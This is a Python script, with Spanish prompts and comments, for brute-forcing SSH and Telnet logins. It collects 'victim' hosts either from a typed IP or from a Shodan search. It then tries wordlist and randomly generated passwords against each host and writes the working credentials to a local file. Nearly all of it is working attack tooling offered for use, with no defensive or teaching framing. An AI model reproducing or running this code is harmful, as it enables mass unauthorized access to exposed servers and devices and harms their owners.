1#!/usr/bin/python3
import ipaddress, string, random, paramiko, sys, os, socket, telnetlib, time
import json
from shodan import Shodan
####################################################################
def comprobarIP(ip):
    correcto=True
    try:
        ipaddress.ip_address(ip)
    except ValueError:
        print('address/netmask is invalid' )
        correcto = False
    return correcto
####################################################################
def pedirNumeroEntero():
    correcto=False
    num=0
    while(not correcto):
        try:
            num = int(input("Introduzca una opción: "))
            correcto=True
        except ValueError:
            print('Error, opción no valida')   
    return num
####################################################################
def password_generator(size=8, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for i in range(size))
####################################################################
def attack_ssh(hostvictima,usuario,password):
    encontrado = True
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(hostname = hostvictima,port = 22, username= usuario,password= password)
        print("Usuario y contraseña correctos: "+usuario +":"+password)
        ssh.close()
        return usuario,password,encontrado
    except paramiko.AuthenticationException:
        print("Error al autenticarse con "+usuario +":"+password)
        ssh.close()
        return "usuario","password",False
    except socket.error:
        print("No se pudo conectar con el host remoto")
        ssh.close()
        return "usuario","password",False
    except paramiko.SSHException:
        print("Error")
        ssh.close()
        return "usuario","password",False
    ssh.close()
####################################################################
def guardarEncontrador(ip,puerto,usuario,password):
    text_file = open(os.path.join(os.path.dirname(__file__), 'Victimasvulnerables.txt'), "a+")
    text_file.write(str(ip)+":"+str(puerto)+":"+str(usuario)+":"+str(password)+"\n")
    text_file.close()
####################################################################
def attack_telnet(hostvictima,usuario,password):
    encontrado = True
    tn = telnetlib.Telnet(hostvictima)
    print(tn.set_debuglevel(2))#Esto es para tener debug
    #print(tn.read_all().decode('ascii'))
    tn.read_until(bytes("Username: ", "UTF-8"))
    tn.write(bytes(usuario + "\r\n", "UTF-8"))
    tn.read_until(bytes("Password: ", "UTF-8"))
    tn.write(bytes(password + "\r\n", "UTF-8"))
    (i) = tn.expect([b'Invalid',b'@'],2)
    if i == 1:
        print ("El usuario es "+ usuario +" y el password es "+password)
        return usuario,password,encontrado
    else:
        encontrado=False
        return usuario,password,encontrado
    tn.close()
####################################################################
def busqueda_shodan(busqueda):
    api = Shodan('ENTER YOUR API KEY')
    results = api.search(busqueda)
    victimas = {}
    for item in results['matches']:
        victimas.update({item['ip_str']:item['port']})
    #para pruebas offline
    #with open(os.path.join(os.path.dirname(__file__), 'victimasguardadas.json'),'r') as json_file:
    #    victimas = json.load(json_file)
    print ("numero de victimas: ",len(victimas))
    return victimas
#########################PRIMER MENU################################
salir = False
opcionMenu1 = 0

while not salir:
 
    print ("1. Introducir IP de la victima")
    print ("2. Realizar busqueda en shodan")
    print ("3. Salir")
    print ("Elige una opcion")
 
    opcionMenu1 = pedirNumeroEntero()
    
    if opcionMenu1 == 1:
        victimasjson = {}
        ipvictima = input("Introduce direccion IP de la victima: ")
        while not comprobarIP(ipvictima):
            ipvictima = input("Introduce direccion IP de la victima: ")
        print ("1. SSH")
        print ("2. Telnet")
        print ("3. Salir")
        opcionMenu1 = pedirNumeroEntero()
        if opcionMenu1 == 1:
            puerto = 22
        elif opcionMenu1 == 2:
            puerto = 23
        elif opcionMenu1 == 3:
            exit(0)
        else:
            print ("Eliga una opcion")
        victimasjson.update({ipvictima:puerto})
        salir = True
    elif opcionMenu1 == 2:
        busqueda = input("Introduce busqueda en shodan: ")
        victimasjson=busqueda_shodan(busqueda)
        salir = True
    elif opcionMenu1 == 3:
        exit(0)
    else:
        print ("Eliga una opcion")
#########################SEGUNDO MENU###############################
salir = False
opcionMenu2 = 0
print("#########################La Victima:#########################")
print ("numero de victimas: ",len(victimasjson))
print (victimasjson)
print("#############################################################")
while not salir:
 
    print ("1. Utilizar wordlist por defecto ")
    print ("2. Introducir wordlist")
    print ("3. Realizar ataque de Fuerza bruta")
    print ("4. Salir")
    print ("Elige una opcion")
 
    passwordencontrado=False
    opcionMenu2 = pedirNumeroEntero()
    ######  OPCION 1
    if opcionMenu2 == 1:
        #Leo archivo de password
        try:
            Directoriopasswd = os.path.join(os.path.dirname(__file__), 'default.pwd')
            file1 = open (Directoriopasswd,'r')
            Lines = file1.readline()
            #Leo el listado de victimas
            for i in range(len(victimasjson)):
                while Lines and not passwordencontrado:
                    x = Lines.split(":")
                    usuariod = x[0]
                    passwordd = x[1].rstrip("\r\n")
                    if int(list(victimasjson.values())[i-1]) == 22:
                        (usuariofinal,passwordfinal,passwordencontrado)=attack_ssh(list(victimasjson.keys())[i-1],usuariod,passwordd)
                    elif int(list(victimasjson.values())[i-1]) == 23:
                        (usuariofinal,passwordfinal,passwordencontrado)=attack_telnet(list(victimasjson.keys())[i-1],usuariod,passwordd)
                    if passwordencontrado == True:
                        Lines = file1.seek(0)
                        guardarEncontrador(list(victimasjson.keys())[i-1],list(victimasjson.values())[i-1],usuariofinal,passwordfinal)
                        print(usuariofinal,passwordfinal)
                    Lines = file1.readline()
                passwordencontrado = False
                Lines = file1.seek(0)
                Lines = file1.readline()
            salir = True
        except IOError:
            print("error al abrir el archivo de contraseñas por favor utilize otra opcion")
            salir = False
    ######  OPCION 2
    elif opcionMenu2 == 2:
        nombredeusuario = input("Introduzca el nombre del usuario: ")
        busqueda = input("Introduzca un path para los passwords: ")
        #Leo archivo de password
        try:
            file1 = open (busqueda,'r')
            Lines = file1.readline()
            #Leo el listado de victimas
            for i in range(len(victimasjson)):
                while Lines and not passwordencontrado:
                    passwordd = Lines.rstrip("\r\n")
                    if int(list(victimasjson.values())[i-1]) == 22:
                        (usuariofinal,passwordfinal,passwordencontrado)=attack_ssh(list(victimasjson.keys())[i-1],nombredeusuario,passwordd)
                    elif int(list(victimasjson.values())[i-1]) == 23:
                        (usuariofinal,passwordfinal,passwordencontrado)=attack_telnet(list(victimasjson.keys())[i-1],nombredeusuario,passwordd)
                    if passwordencontrado == True:
                        Lines = file1.seek(0)
                        guardarEncontrador(list(victimasjson.keys())[i-1],list(victimasjson.values())[i-1],usuariofinal,passwordfinal)
                        print(usuariofinal,passwordfinal)
                    Lines = file1.readline()
                passwordencontrado = False
                Lines = file1.seek(0)
                Lines = file1.readline()
            salir = True
        except IOError:
            print("error al abrir el archivo de contraseñas por favor utilize otra opcion")
            salir = False    
    ###### OPCION 3
    elif opcionMenu2 == 3:
        nombredeusuario = input("Introduzca el nombre del usuario: ")
        i=0
        j=0
        passwordusados=[]
        for k in range(len(victimasjson)):
            while i <= 16 and not passwordencontrado:
                while j < (62**(i+1)) and not passwordencontrado:
                    passwordautilizar=password_generator(i+1)
                    if passwordautilizar not in passwordusados:
                        passwordusados.append(passwordautilizar)
                        if int(list(victimasjson.values())[k-1]) == 22:
                            (usuariofinal,passwordfinal,encontrado)=attack_ssh(list(victimasjson.keys())[k-1],nombredeusuario,passwordautilizar)
                        elif int(list(victimasjson.values())[k-1]) == 23:
                            (usuariofinal,passwordfinal,encontrado)=attack_telnet(list(victimasjson.keys())[k-1],nombredeusuario,passwordautilizar)
                        if encontrado == True:
                            i=0
                            j=0
                            passwordencontrado = True
                            guardarEncontrador(list(victimasjson.keys())[k-1],list(victimasjson.values())[k-1],usuariofinal,passwordfinal)
                            print(usuariofinal,passwordfinal)    
                        j+=1
                    else:
                        j=len(passwordusados)
                j=0
                i+=1
            i=0
            j=0
            passwordencontrado = False
        salir = True
    ###### FIN OPCION 3
    elif opcionMenu2 == 4:
        exit(0)
    else:
        print ("Eliga una opcion")
